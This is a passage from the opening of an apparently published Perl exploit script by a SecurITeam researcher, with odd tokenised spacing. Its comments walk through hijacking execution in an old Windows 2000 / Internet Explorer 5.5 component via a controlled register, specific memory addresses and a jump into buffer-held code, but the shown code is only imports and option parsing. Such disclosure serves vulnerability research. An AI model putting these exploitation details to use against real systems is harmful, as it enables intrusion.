Earlier versions may be affected , however , they are no longer supported by Microsoft. ，  #  ( The exploit code will not work straight out of the \"box\" )  ，  # Noam Rathaus - Beyond Security Ltd.'s SecurITeam ，  # Note the certificate is a valid one for noamr @ beyondsecurity.com issued by Thawe. ，  # Message ( buffer ) starts at 0006F578 ( circa )  ，  # Message ( buffer ) ends at 0006F94C ( circa )  ，  # The problem lies here :  ，  # 5F26F339 mov ebx , dword ptr [ eax ]  ，  # . ，  # . ，  # 5F26F354 call dword ptr [ ebx+10h ]  ，  # . ，  # . ，  # Now since we control the EAX , but we can't provide it with NULLs , we must find somewhere in the ，  # kernel memory a place that has the following number ( of our buffer )  , for example :  ，  # We found 00 06 F5 A4 at 5F1835C7 ，  # Windows 2000 SP3 Internet Explorer 5.5 ，  # So our 5F1835C7 is placed in EAX , which has this memory content 0006F5A4 ，  # Causing our MOV to place in EBX the the following content 00 06 F5 A4. ，  # The final EIP call goes out to 0006F5B4 , this is where our arbitrary code lies. ， use Getopt :  : Std ;  ， use IO :  : Socket :  : INET ;  ， use MIME :  : Base64 ;  ， getopt ( 'tfhi' )  ; ",
